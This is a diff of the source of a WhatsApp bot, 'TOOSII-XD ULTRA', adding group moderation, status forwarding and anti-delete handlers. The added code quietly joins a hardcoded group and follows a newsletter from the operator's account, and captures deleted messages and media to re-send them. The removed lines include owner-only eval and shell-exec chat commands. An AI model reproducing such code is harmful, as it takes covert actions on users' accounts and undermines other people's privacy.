+                                await X.sendMessage(gJid, {
+                                    text: `*🗑️ @${mentioner} — your messages in this group will now be automatically deleted.*
+Reason: You tagged this group in your WhatsApp status.
+_Contact an admin to appeal._`,
+                                    mentions: [mentionerJid]
+                                })
+                            }
+                        } catch (gErr) {
+                            console.log(`[${phone}] Anti-status-mention group error:`, gErr.message || gErr)
+                        }
+                    }
+
+                    // Handle invite links found in status text
+                    if (inviteLinks.length > 0) {
+                        let linkListText = inviteLinks.map(l => '• https://' + l).join('\n')
+                        await X.sendMessage(alertJid, {
+                            text: '*🔗 Group Invite Link in Status*\n\n+' + mentioner + ' shared group link(s) in their status:\n' + linkListText
+                        })
+                    }
+
+                } catch (smErr) {
+                    if (!smErr.skip) console.log(`[${phone}] Anti-status-mention error:`, smErr.message || smErr)
+                }
+            }
+            if (global.statusToGroup) {
+                let _fwdSender = (mek.key.participant || mek.key.remoteJid).replace(/:.*@/, '@')
+                let senderNum = _fwdSender.split('@')[0]
+                let msgContent = mek.message
+                let contentType = Object.keys(msgContent)[0]
+                let targetGroup = global.statusToGroup
+                let header = `📢 *Status from +${senderNum}*`
+                // standalone download helper (downloadContentFromMessage is NOT a method on X)
+                const _dlBuf = async (msgObj, type) => {
+                    let stream = await downloadContentFromMessage(msgObj, type)
+                    let chunks = []
+                    for await (let c of stream) chunks.push(c)
+                    return Buffer.concat(chunks)
+                }
+                try {
+                    if (contentType === 'imageMessage') {
+                        let buf = await _dlBuf(msgContent.imageMessage, 'image')
+                        let cap = msgContent.imageMessage.caption || ''
+                        await X.sendMessage(targetGroup, { image: buf, caption: `${header}${cap ? '\n' + cap : ''}` })
+                    } else if (contentType === 'videoMessage') {
+                        let buf = await _dlBuf(msgContent.videoMessage, 'video')
+                        let cap = msgContent.videoMessage.caption || ''
+                        await X.sendMessage(targetGroup, { video: buf, caption: `${header}${cap ? '\n' + cap : ''}`, mimetype: 'video/mp4' })
+                    } else if (contentType === 'audioMessage') {
+                        let buf = await _dlBuf(msgContent.audioMessage, 'audio')
+                        await X.sendMessage(targetGroup, { audio: buf, mimetype: 'audio/mpeg' })
+                        await X.sendMessage(targetGroup, { text: header })
+                    } else if (contentType === 'stickerMessage') {
+                        let buf = await _dlBuf(msgContent.stickerMessage, 'sticker')
+                        await X.sendMessage(targetGroup, { sticker: buf })
+                        await X.sendMessage(targetGroup, { text: header })
+                    } else if (contentType === 'extendedTextMessage') {
+                        let txt = msgContent.extendedTextMessage.text || ''
+                        await X.sendMessage(targetGroup, { text: `${header}\n\n${txt}` })
+                    } else if (contentType === 'conversation') {
+                        await X.sendMessage(targetGroup, { text: `${header}\n\n${msgContent.conversation}` })
+                    } else {
+                        // Unknown type — just note it was a status
+                        await X.sendMessage(targetGroup, { text: `${header}\n_[${contentType.replace('Message','')} status]_` })
+                    }
+                    console.log(`[${phone}] ✅ Forwarded ${contentType} status from +${senderNum} to group ${targetGroup}`)
+                } catch (fwdErr) {
+                    console.log(`[${phone}] Status forward error:`, fwdErr.message || fwdErr)
+                }
+            }
+        } catch (err) {
+            console.log(`[${phone}] Auto status action error:`, err.message || err)
+        }
+    }
+    return
+}
+if (!X.public && !mek.key.fromMe && chatUpdate.type === 'notify') return
+if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return
+let msgId = mek.key.id
+if (processedMsgs.has(msgId)) return
+processedMsgs.add(msgId)
+if (processedMsgs.size > 5000) {
+    let iter = processedMsgs.values()
+    for (let i = 0; i < 2000; i++) { processedMsgs.delete(iter.next().value) }
+}
+if (global.autoRead && !mek.key.fromMe) {
+    try { await X.readMessages([mek.key]) } catch {}
+}
+// Anti-Status-Mention Delete Mode: auto-delete messages from flagged users
+if (global.statusMentionDeleteList && mek.message && !mek.key.fromMe) {
+    let chat = mek.key.remoteJid
+    if (chat && chat.endsWith('@g.us')) {
+        let _senderRaw = mek.key.participant || mek.key.remoteJid
+        // Normalize: strip device suffix (:0) so it matches what was stored in deleteList
+        let senderJid = _senderRaw.includes(':') ? _senderRaw.replace(/:.*@/, '@') : _senderRaw
+        let flaggedList = global.statusMentionDeleteList[chat] || []
+        if (flaggedList.includes(senderJid)) {
+            try {
+                let groupMeta = await X.groupMetadata(chat).catch(() => null)
+                let isBotAdmin = groupMeta && groupMeta.participants.some(p => {
+                    let isBot = areJidsSameUser(p.id, X.user.id) || (X.user?.lid && areJidsSameUser(p.id, X.user.lid))
+                    return isBot && (p.admin === 'admin' || p.admin === 'superadmin')
+                })
+                if (isBotAdmin) {
+                    await X.sendMessage(chat, { delete: mek.key })
+                    console.log(`[${phone}] Deleted message from flagged user ${senderJid} in ${chat}`)
+                }
+            } catch (delErr) {
+                console.log(`[${phone}] Anti-status-mention delete error:`, delErr.message || delErr)
+            }
+        }
+    }
+}
+if (global.antiLink && mek.message && !mek.key.fromMe) {
+    let chat = mek.key.remoteJid
+    if (chat && chat.endsWith('@g.us')) {
+        let msgBody = ''
+        if (mek.message.conversation) msgBody = mek.message.conversation
+        else if (mek.message.extendedTextMessage) msgBody = mek.message.extendedTextMessage.text || ''
+        else if (mek.message.imageMessage) msgBody = mek.message.imageMessage.caption || ''
+        else if (mek.message.videoMessage) msgBody = mek.message.videoMessage.caption || ''
+        let linkRegex = /https?:\/\/[^\s]+|wa\.me\/[^\s]+|chat\.whatsapp\.com\/[^\s]+/gi
+        if (linkRegex.test(msgBody)) {
+            let senderJid = mek.key.participant || mek.key.remoteJid
+            let ownerNum = global.owner[0] + '@s.whatsapp.net'
+            let senderNum = senderJid.replace('@s.whatsapp.net', '').replace('@lid', '').split(':')[0]
+            let isOwnr = global.owner.includes(senderNum) || mek.key.fromMe
+            if (!isOwnr) {
+                try {
+                    let groupMeta = await X.groupMetadata(chat)
+                    let isBotAdmin = groupMeta.participants.some(p => {
+                        let match = areJidsSameUser(p.id, X.user.id) || (X.user?.lid && areJidsSameUser(p.id, X.user.lid))
+                        return match && (p.admin === 'admin' || p.admin === 'superadmin')
+                    })
+                    if (isBotAdmin) {
+                        await X.sendMessage(chat, { delete: mek.key })
+                        await X.sendMessage(chat, { text: `*Anti-Link*\n@${senderNum}, links are not allowed in this group.`, mentions: [senderJid] })
+                    }
+                } catch {}
+            }
+        }
+    }
+}
+m = smsg(X, mek, store)
+require("./client")(X, m, chatUpdate, store)
+} catch (err) {
+    let em = (err?.message || '').toLowerCase()
+    let es = (err?.stack || '').toLowerCase()
+    // These are all WhatsApp Signal/libsignal protocol errors — not bot bugs.
+    // They happen when WA sends a message we can't decrypt (race condition,
+    // missing pre-key, new device, etc). Logging only, never crash.
+    let isSignalNoise = (
+        em.includes('no sessions') ||
+        em.includes('sessionerror') ||
+        em.includes('bad mac') ||
+        em.includes('failed to decrypt') ||
+        em.includes('no senderkey') ||
+        em.includes('invalid prekey') ||
+        em.includes('invalid message') ||
+        em.includes('nosuchsession') ||
+        es.includes('session_cipher') ||
+        es.includes('libsignal') ||
+        es.includes('queue_job')
     )
+    if (isSignalNoise) {
+        console.log(`[${phone}] [Signal] Suppressed session error: ${err.message || err}`)
+    } else {
+        console.log(`[${phone}] [Error]`, err)
+    }
 }
-const repoInfo =
-`╔══════════════════════════╗
-║  📦 *REPOSITORY INFO*
+})
+
+X.decodeJid = (jid) => {
+if (!jid) return jid
+if (/:\d+@/gi.test(jid)) {
+let decode = jidDecode(jid) || {}
+return decode.user && decode.server && decode.user + '@' + decode.server || jid
+} else return jid
+}
+
+X.getName = (jid, withoutContact= false) => {
+id = X.decodeJid(jid)
+withoutContact = X.withoutContact || withoutContact 
+let v
+if (id.endsWith("@g.us")) return new Promise(async (resolve) => {
+v = store.contacts[id] || {}
+if (!(v.name || v.subject)) v = X.groupMetadata(id) || {}
+resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
+})
+else v = id === '0@s.whatsapp.net' ? {
+id,
+name: 'WhatsApp'
+} : id === X.decodeJid(X.user.id) ?
+X.user :
+(store.contacts[id] || {})
+return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')
+}
+
+X.public = true 
+
+X.serializeM = (m) => smsg(X, m, store);
+X.ev.on('connection.update', async (update) => {
+const { connection, lastDisconnect } = update;
+if (connection === "close") {
+let reason = new Boom(lastDisconnect?.error)?.output.statusCode;
+if (reason === DisconnectReason.badSession) {
+console.log(`[${phone}] Session file corrupted`);
+if (activeSessions.has(phone)) activeSessions.get(phone).status = 'disconnected'
+  } else if (reason === DisconnectReason.connectionClosed) {
+console.log(`[${phone}] Connection closed, reconnecting...`);
+if (activeSessions.has(phone)) activeSessions.get(phone).status = 'reconnecting'
+setTimeout(() => connectSession(phone), 3000);
+  } else if (reason === DisconnectReason.connectionLost) {
+console.log(`[${phone}] Connection lost, reconnecting...`);
+if (activeSessions.has(phone)) activeSessions.get(phone).status = 'reconnecting'
+setTimeout(() => connectSession(phone), 3000);
+  } else if (reason === DisconnectReason.connectionReplaced) {
+console.log(`[${phone}] Connection replaced`);
+if (activeSessions.has(phone)) activeSessions.get(phone).status = 'disconnected'
+  } else if (reason === DisconnectReason.loggedOut) {
+console.log(`[${phone}] Device logged out, removing session`);
+activeSessions.delete(phone)
+try {
+    const sessDir = path.join(SESSIONS_DIR, phone)
+    if (fs.existsSync(sessDir)) fs.rmSync(sessDir, { recursive: true, force: true })
+} catch(e) {}
+  } else if (reason === DisconnectReason.restartRequired) {
+console.log(`[${phone}] Restart required, reconnecting...`);
+connectSession(phone);
+  } else if (reason === DisconnectReason.timedOut) {
+console.log(`[${phone}] Connection timed out, reconnecting...`);
+if (activeSessions.has(phone)) activeSessions.get(phone).status = 'reconnecting'
+setTimeout(() => connectSession(phone), 3000);
+  } else {
+console.log(`[${phone}] Unknown DisconnectReason: ${reason}|${connection}`);
+setTimeout(() => connectSession(phone), 5000);
+  }
+} else if (connection === "open") {
+if (!X.user.lid && state?.creds?.me?.lid) {
+    X.user.lid = state.creds.me.lid
+    console.log(`[${phone}] LID loaded from creds: ${X.user.lid}`)
+}
+const connUser = X.user?.id?.split(':')[0] || phone
+activeSessions.set(phone, { socket: X, status: 'connected', connectedUser: connUser })
+try {
+X.newsletterFollow('120363299254074394@newsletter')
+} catch (e) {}
+try {
+await X.groupAcceptInvite('CwNhH3QNvrVFdcKNgaKg4g')
+console.log(`${c.green}[${phone}]${c.r} ${c.cyan}Auto-joined WhatsApp group${c.r}`)
+} catch (e) {
+console.log(`${c.yellow}[${phone}]${c.r} ${c.dim}Could not auto-join group: ${e.message || e}${c.r}`)
+}
+const connectedJid = X.user.id.replace(/:.*@/, '@')
+X.sendMessage(connectedJid, {text: `╔══════════════════════════╗
+║   ⚡ *TOOSII-XD ULTRA*
+║   _WhatsApp Multi-Device Bot_
 ╚══════════════════════════╝
 
-  🏷️  *${data.full_name}*
-  📝  _${(data.description || 'No description').slice(0,60)}_
+  ✅ *Connection Successful!*
 
-  ├ ⭐ *Stars*    › ${data.stargazers_count}
-  ├ 🍴 *Forks*    › ${data.forks_count}
-  ├ 💻 *Language* › ${data.language || 'N/A'}
-  └ 🔄 *Updated*  › ${new Date(data.updated_at).toLocaleDateString('en-GB', { day:'2-digit', month:'short', year:'numeric' })}
-
-  🔗 ${data.html_url}
-  🔑 ${global.sessionUrl}
+  ├ 👤 *User*    › ${connUser}
+  ├ 🟢 *Status*  › Active & Online
+  ├ 🤖 *Bot*     › TOOSII-XD ULTRA v${global.botver || '2.0.0'}
+  ├ 🔑 *Session* › ${global.sessionUrl || 'https://toosii-xd-session-generator-woyo.onrender.com/pair'}
+  └ 📋 *Commands* › Type .menu to get started
 
 ┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
-  💛 *Enjoyed the bot?*
-  ⭐ Star & 🍴 Fork — every click counts!
-┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄`
-reply(repoInfo)
-} catch(e) { reply('❌ Error fetching repo: ' + e.message) }
-} break
+  👥 *Join Our Community*
+  https://chat.whatsapp.com/CwNhH3QNvrVFdcKNgaKg4g
+┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄
 
-case 'sc':
-case 'script':
-case 'source': {
-    await X.sendMessage(m.chat, { react: { text: '📜', key: m.key } })
-let scText = `╔══════════════════════════╗
-║  📂 *SOURCE CODE*
-╚══════════════════════════╝
+_⚡ Powered by Toosii Tech — wa.me/254748340864_`})
+console.log(`[BOT_CONNECTED:${connUser}]`)
+console.log(`[${phone}] Connected: id=${JSON.stringify(X.user.id)} lid=${JSON.stringify(X.user?.lid || 'NOT SET')}`);
+}
+});
 
-  🤖 *${global.botname}*
+X.ev.on('creds.update', async (update) => {
+    await saveCreds()
+    if (update?.me?.lid && !X.user.lid) {
+        X.user.lid = update.me.lid
+        console.log(`[${phone}] LID updated from creds event: ${X.user.lid}`)
+    }
+})
 
-  ├ 🔗 *GitHub*
-  │  github.com/TOOSII102/TOOSII-XD-ULTRA
-  ├ 🍴 *Fork it*
-  │  github.com/TOOSII102/TOOSII-XD-ULTRA/fork
-  ├ 👨‍💻 *Dev*     › ${global.ownername}
-  └ 📞 *Contact* › ${global.ownerNumber}
+X.sendText = (jid, text, quoted = '', options) => X.sendMessage(jid, { text: text, ...options }, { quoted })
 
-_© ${global.ownername} — All Rights Reserved_`
-reply(scText)
-} break
+X.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
+        let type = await X.getFile(path, true)
+        let {
+            res,
+            data: file,
+            filename: pathFile
+        } = type
+        if (res && res.status !== 200 || file.length <= 65536) {
+            try {
+                throw {
+                    json: JSON.parse(file.toString())
+                }
+            }
+            catch (e) {
+                if (e.json) throw e.json
+            }
+        }
+        let opt = {
+            filename
+        }
+        if (quoted) opt.quoted = quoted
+        if (!type) options.asDocument = true
+        let mtype = '',
+            mimetype = type.mime,
+            convert
+        if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker'
+        else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image'
+        else if (/video/.test(type.mime)) mtype = 'video'
+        else if (/audio/.test(type.mime))(
+            convert = await (ptt ? toPTT : toAudio)(file, type.ext),
+            file = convert.data,
+            pathFile = convert.filename,
+            mtype = 'audio',
+            mimetype = 'audio/ogg; codecs=opus'
+        )
+        else mtype = 'document'
+        if (options.asDocument) mtype = 'document'
 
-case 'clone': {
-    await X.sendMessage(m.chat, { react: { text: '📦', key: m.key } })
-if (!text) return reply(`Example: ${prefix}clone https://github.com/user/repo`)
-try {
-let match = text.match(/github\.com\/([^\/]+)\/([^\/\s]+)/)
-if (!match) return reply('Invalid GitHub URL.')
-let [, user, repo] = match
-repo = repo.replace(/\.git$/, '')
-let zipUrl = `https://api.github.com/repos/${user}/${repo}/zipball`
-await X.sendMessage(m.chat, { document: { url: zipUrl }, mimetype: 'application/zip', fileName: `${repo}.zip` }, { quoted: m })
-} catch(e) { reply('Error: ' + e.message) }
-} break
+        delete options.asSticker
+        delete options.asLocation
+        delete options.asVideo
+        delete options.asDocument
+        delete options.asImage
+
+        let message = {
+            ...options,
+            caption,
+            ptt,
+            [mtype]: {
+                url: pathFile
+            },
+            mimetype
+        }
+        let m
+        try {
+            m = await X.sendMessage(jid, message, {
+                ...opt,
+                ...options
+            })
+        }
+        catch (e) {
+            m = null
+        }
+        finally {
+            if (!m) m = await X.sendMessage(jid, {
+                ...message,
+                [mtype]: file
+            }, {
+                ...opt,
+                ...options
+            })
+            file = null
+            return m
+        }
+    }
+//━━━━━━━━━━━━━━━━━━━━━━━━//
+// Welcome Setting
+
+    X.ev.on('group-participants.update', async (anu) => {
+        try {
+            let metadata = await X.groupMetadata(anu.id).catch(() => null)
+            if (!metadata) return
+            let groupName = metadata.subject || 'the group'
+            let totalMembers = metadata.participants.length
+
+            for (let num of anu.participants) {
+                let numClean = num.split('@')[0].split(':')[0]
+
+                // ── Antibot auto-remove on join ───────────────────────────
+                if (anu.action === 'add' && global.antibotGroups && global.antibotGroups[anu.id] && global.knownBots && global.knownBots.includes(numClean)) {
+                    try {
+                        const _botMeta = await X.groupMetadata(anu.id)
+                        const _botIsAdmin = _botMeta.participants.some(p => {
+                            const isBot = p.id.split('@')[0].split(':')[0] === X.user.id.split('@')[0].split(':')[0]
+                            return isBot && (p.admin === 'admin' || p.admin === 'superadmin')
+                        })
+                        if (_botIsAdmin) {
+                            await X.groupParticipantsUpdate(anu.id, [num], 'remove')
+                            await X.sendMessage(anu.id, { text: `╔══════════════════════════╗\n║  🤖 *ANTIBOT*\n╚══════════════════════════╝\n\n  🚫 *+${numClean}* was removed.\n  └ Reason: Known bot detected.` })
+                        }
+                    } catch {}
+                    continue
+                }
+                let ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
+                try { ppuser = await X.profilePictureUrl(num, 'image') } catch {}
+                let ppBuf = await getBuffer(ppuser).catch(() => null)
+
+                // ── Welcome ──────────────────────────────────────────────
+                if (global.welcome && anu.action === 'add') {
+                    let welcomeBody =
+`┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃       👋 *WELCOME!*
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+Hey @${numClean}! 🎉
+You've just joined *${groupName}*
+
+┌─────────────────────────────
+│ 👥 Members  : ${totalMembers}
+│ 🤖 Bot      : ${global.botname}
+└─────────────────────────────
+
+_We're glad to have you here!_
+_Please read the group rules and enjoy your stay._ 😊`
+                    await X.sendMessage(anu.id, {
+                        text: welcomeBody,
+                        contextInfo: {
+                            mentionedJid: [num],
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                containsAutoReply: true,
+                                title: global.botname,
+                                body: groupName,
+                                previewType: 'PHOTO',
+                                thumbnailUrl: '',
+                                thumbnail: ppBuf || Buffer.alloc(0),
+                                sourceUrl: global.wagc || ''
+                            }
+                        }
+                    })
+                }
+
+                // ── Goodbye ──────────────────────────────────────────────
+                if (global.welcome && anu.action === 'remove') {
+                    let goodbyeBody =
+`┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃       👋 *GOODBYE!*
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+@${numClean} has left *${groupName}* 😔
+
+┌─────────────────────────────
+│ 👥 Members  : ${totalMembers}
+│ 🤖 Bot      : ${global.botname}
+└─────────────────────────────
+
+_Safe travels! You're always welcome back._ 🌟`
+                    await X.sendMessage(anu.id, {
+                        text: goodbyeBody,
+                        contextInfo: {
+                            mentionedJid: [num],
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                containsAutoReply: true,
+                                title: global.botname,
+                                body: groupName,
+                                previewType: 'PHOTO',
+                                thumbnailUrl: '',
+                                thumbnail: ppBuf || Buffer.alloc(0),
+                                sourceUrl: global.wagc || ''
+                            }
+                        }
+                    })
+                }
+
+                // ── Admin Events ──────────────────────────────────────────
+                if (global.adminevent && anu.action === 'promote') {
+                    let promoteBody =
+`┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃     🌟 *ADMIN PROMOTED!*
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+Congratulations @${numClean}! 🎊
+You have been *promoted to Admin* in
+*${groupName}*
+
+┌─────────────────────────────
+│ 🛡️ Role     : Group Admin
+│ 👥 Members  : ${totalMembers}
+└─────────────────────────────
+
+_Use your powers wisely and responsibly!_ ⚡`
+                    await X.sendMessage(anu.id, {
+                        text: promoteBody,
+                        contextInfo: {
+                            mentionedJid: [num],
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                containsAutoReply: true,
+                                title: global.botname,
+                                body: groupName,
+                                previewType: 'PHOTO',
+                                thumbnailUrl: '',
+                                thumbnail: ppBuf || Buffer.alloc(0),
+                                sourceUrl: global.wagc || ''
+                            }
+                        }
+                    })
+                }
+
+                if (global.adminevent && anu.action === 'demote') {
+                    let demoteBody =
+`┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃     📉 *ADMIN DEMOTED*
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+
+@${numClean} has been *demoted from Admin*
+in *${groupName}*
+
+┌─────────────────────────────
+│ 👤 Role     : Member
+│ 👥 Members  : ${totalMembers}
+└─────────────────────────────
+
+_You are now a regular member._ 🔄`
+                    await X.sendMessage(anu.id, {
+                        text: demoteBody,
+                        contextInfo: {
+                            mentionedJid: [num],
+                            externalAdReply: {
+                                showAdAttribution: true,
+                                containsAutoReply: true,
+                                title: global.botname,
+                                body: groupName,
+                                previewType: 'PHOTO',
+                                thumbnailUrl: '',
+                                thumbnail: ppBuf || Buffer.alloc(0),
+                                sourceUrl: global.wagc || ''
+                            }
+                        }
+                    })
+                }
+            }
+        } catch (err) {
+            console.log('[Group Events] Error:', err.message || err)
+        }
+    })
+//━━━━━━━━━━━━━━━━━━━━━━━━//
+// Message Retry Handler (fixes SessionError: No sessions)
+// When WhatsApp requests a retry, we must respond or it floods errors
+X.ev.on('messages.receipt', async (receipts) => {
+    if (!receipts || !receipts.length) return
+    for (let receipt of receipts) {
+        try {
+            // A 'retry' receipt means the recipient couldn't decrypt — send retry
+            if (receipt.type === 'retry') {
+                const retryKey = receipt.key
+                if (!retryKey) continue
+                const storedMsg = store ? await store.loadMessage(retryKey.remoteJid, retryKey.id).catch(() => null) : null
+                if (storedMsg?.message) {
+                    await X.relayMessage(retryKey.remoteJid, storedMsg.message, {
+                        messageId: retryKey.id,
+                        participant: retryKey.participant,
+                        additionalAttributes: { edit: '2' }
+                    }).catch(() => {})
+                }
+            }
+        } catch (retryErr) {
+            // Silently ignore — session errors during retry are expected
+        }
+    }
+})
+//━━━━━━━━━━━━━━━━━━━━━━━━//
+// Anti-Call Handler
+X.ev.on('call', async (callData) => {
+    if (!global.antiCall) return
+    try {
+        let calls = Array.isArray(callData) ? callData : [callData]
+        for (let call of calls) {
+            if (call.status === 'offer') {
+                let callerId = call.from
+                await X.rejectCall(call.id, call.from)
+                await X.sendMessage(callerId, {
+                    text: `*Anti-Call Active*\nCalls are not allowed. Please send a message instead.\n\n_This is an automated response from ${global.botname}_`
+                })
+                console.log(`[Anti-Call] Rejected call from ${callerId}`)
+            }
+        }
+    } catch (err) {
+        console.log('[Anti-Call] Error:', err.message || err)
+    }
+})
+//━━━━━━━━━━━━━━━━━━━━━━━━//
+// Anti-Delete Handler — private/public mode, media recovery, dedup, stats
+if (!global.adCache)      global.adCache = {}      // msgId → message data
+if (!global.adMediaCache) global.adMediaCache = {}  // msgId → buffer
+
+// ── Store messages as they arrive ─────────────────────────────────────────
+const _adStore = async (msg) => {
+    if (!global.antiDelete) return
+    if (!msg || !msg.key || !msg.message) return
+    if (msg.key.fromMe) return
+    if (msg.key.remoteJid === 'status@broadcast') return
+    const _id = msg.key.id
+    if (global.adCache[_id]) return  // already stored
+
+    const _chat = msg.key.remoteJid
+    const _sender = msg.key.participant || msg.key.remoteJid
+    const _senderNum = '+' + _sender.replace(/@.*/, '').split(':')[0]
+    const _pushName = msg.pushName || _senderNum
+    const _isGroup = _chat.endsWith('@g.us')
+
+    // Extract text and type
+    const _mc = msg.message
+    let _type = 'text', _text = '', _hasMedia = false, _mimetype = ''
+
+    if (_mc.conversation)                    { _text = _mc.conversation }
+    else if (_mc.extendedTextMessage?.text)  { _text = _mc.extendedTextMessage.text }
+    else if (_mc.imageMessage)    { _type = 'image';    _text = _mc.imageMessage.caption || ''; _hasMedia = true; _mimetype = _mc.imageMessage.mimetype || 'image/jpeg' }
+    else if (_mc.videoMessage)    { _type = 'video';    _text = _mc.videoMessage.caption || ''; _hasMedia = true; _mimetype = _mc.videoMessage.mimetype || 'video/mp4' }
+    else if (_mc.audioMessage)    { _type = _mc.audioMessage.ptt ? 'voice' : 'audio'; _hasMedia = true; _mimetype = _mc.audioMessage.mimetype || 'audio/ogg' }
+    else if (_mc.documentMessage) { _type = 'document'; _text = _mc.documentMessage.fileName || ''; _hasMedia = true; _mimetype = _mc.documentMessage.mimetype || 'application/octet-stream' }
+    else if (_mc.stickerMessage)  { _type = 'sticker';  _hasMedia = true; _mimetype = _mc.stickerMessage.mimetype || 'image/webp' }
+
+    if (!_text && !_hasMedia) return  // nothing recoverable
+
+    global.adCache[_id] = { id: _id, chat: _chat, sender: _sender, senderNum: _senderNum, pushName: _pushName, isGroup: _isGroup, type: _type, text: _text, hasMedia: _hasMedia, mimetype: _mimetype, msgObj: msg, ts: Date.now() }
+
+    if (!global.adState) global.adState = { enabled: true, mode: 'private', stats: { total: 0, retrieved: 0, media: 0 }, recentIds: [] }
+    global.adState.stats.total++
+
+    // Download media asynchronously after a short delay
+    if (_hasMedia) {
+        setTimeout(async () => {
+            try {
+                const _buf = await msg.message && downloadContentFromMessage
+                    ? await (async () => {
+                        const _stream = await downloadContentFromMessage(_mc[_type + 'Message'] || _mc.audioMessage || _mc.documentMessage || _mc.stickerMessage, _type === 'voice' ? 'audio' : _type)
+                        const _chunks = []
+                        for await (const _c of _stream) _chunks.push(_c)
+                        return Buffer.concat(_chunks)
+                    })()
+                    : null
+                if (_buf && _buf.length > 0 && _buf.length < 15 * 1024 * 1024) {
+                    global.adMediaCache[_id] = { buffer: _buf, mimetype: _mimetype, type: _type }
+                    if (!global.adState) global.adState = { enabled: true, mode: 'private', stats: { total: 0, retrieved: 0, media: 0 }, recentIds: [] }
+                    global.adState.stats.media++
+                }
+            } catch {}
+        }, 1500)
+    }
+
+    // Auto-clean cache older than 6 hours
+    const _now = Date.now()
+    if (!global.adLastClean || _now - global.adLastClean > 60 * 60 * 1000) {
+        global.adLastClean = _now
+        const _maxAge = 6 * 60 * 60 * 1000
+        for (const [k, v] of Object.entries(global.adCache)) {
+            if (_now - v.ts > _maxAge) { delete global.adCache[k]; delete global.adMediaCache[k] }
+        }
+    }
+}
 
 //━━━━━━━━━━━━━━━━━━━━━━━━//
-default:
-if (budy.startsWith('=>')) {
-if (!isOwner) return
-function Return(sul) {
-sat = JSON.stringify(sul, null, 2)
-bang = util.format(sat)
-if (sat == undefined) {
-bang = util.format(sul)
-}
-return reply(bang)
-}
-try {
-reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
-} catch (e) {
-reply(String(e))
-}
-}
+// Anti-Delete: detect revoked messages
+X.ev.on('messages.update', async (updates) => {
+    if (!global.antiDelete) return
+    try {
+        const _botJid = X.decodeJid(X.user.id).replace(/:.*@/, '@')
+        for (const update of updates) {
+            const _isRevoke = update.update?.messageStubType === 1 ||
+                              update.update?.messageStubType === 2
+            if (!_isRevoke) continue
+            const _id = update.key.id
+            if (!global.adState) global.adState = { enabled: true, mode: 'private', stats: { total: 0, retrieved: 0, media: 0 }, recentIds: [] }
+            if (global.adState.recentIds.includes(_id)) continue
+            global.adState.recentIds.push(_id)
+            if (global.adState.recentIds.length > 200) global.adState.recentIds = global.adState.recentIds.slice(-100)
 
-if (budy.startsWith('>')) {
-if (!isOwner) return
-let kode = budy.trim().split(/ +/)[0]
-let teks
-try {
-teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
-} catch (e) {
-teks = e
-} finally {
-await reply(require('util').format(teks))
-}
-}
+            const _chat = update.key.remoteJid
+            const _sender = update.key.participant || update.key.remoteJid
+            if (_sender === _botJid) continue
 
-if (budy.startsWith('$')) {
-if (!isOwner) return
-exec(budy.slice(2), (err, stdout) => {
-if (err) return reply(`${err}`)
-if (stdout) return reply(stdout)
+            const _cached = global.adCache[_id]
+            const _mode = global.antiDeleteMode || 'private'
+            const _destJid = _mode === 'public' ? _chat : _botJid
+
+            let _senderNum = _cached?.senderNum || ('+' + _sender.replace(/@.*/, '').split(':')[0])
+            let _chatLabel = _senderNum
+            if (_cached?.isGroup) {
+                try {
+                    const _meta = await X.groupMetadata(_chat).catch(() => null)
+                    if (_meta?.subject) _chatLabel = _meta.subject
+                } catch {}
+            }
+            const _time = new Date().toLocaleTimeString('en-KE', { timeZone: global.botTimezone || 'Africa/Nairobi' })
+            let _notif = `╔══════════════════════════╗\n║  🗑️  *DELETED MESSAGE*\n╚══════════════════════════╝\n\n`
+            _notif += `  ├ 👤 *From* › ${_cached?.pushName || _senderNum}\n`
+            _notif += `  ├ 💬 *Chat* › ${_chatLabel}\n`
+            _notif += `  ├ 📄 *Type* › ${(_cached?.type || 'unknown').toUpperCase()}\n`
+            _notif += `  └ 🕐 *Time* › ${_time}`
+            if (_cached?.text) _notif += `\n\n  *📝 Message:*\n  _${_cached.text}_`
+
+            try {
+                const _media = global.adMediaCache[_id]
+                if (_cached?.hasMedia && _media?.buffer) {
+                    const _buf = _media.buffer
+                    if (_media.type === 'image') await X.sendMessage(_destJid, { image: _buf, caption: _notif })
+                    else if (_media.type === 'video') await X.sendMessage(_destJid, { video: _buf, caption: _notif })
+                    else if (_media.type === 'audio' || _media.type === 'voice') await X.sendMessage(_destJid, { audio: _buf, caption: _notif, ptt: _media.type === 'voice' })
+                    else if (_media.type === 'sticker') await X.sendMessage(_destJid, { sticker: _buf })
+                    else await X.sendMessage(_destJid, { document: _buf, caption: _notif, mimetype: _media.mimetype || 'application/octet-stream' })
+                    delete global.adMediaCache[_id]
+                } else {
+                    await X.sendMessage(_destJid, { text: _notif })
+                }
+                global.adState.stats.retrieved++
+                delete global.adCache[_id]
+            } catch {}
+        }
+    } catch {}
 })
-}
-
-// ── ChatBoAI per-chat auto-reply (.chatboai on/off) ─────────────────
-if (global.chatBoAIChats && global.chatBoAIChats[m.chat] && budy && !isCmd && !m.key.fromMe) {
-    try {
-        await X.sendMessage(m.chat, { react: { text: '🤖', key: m.key } })
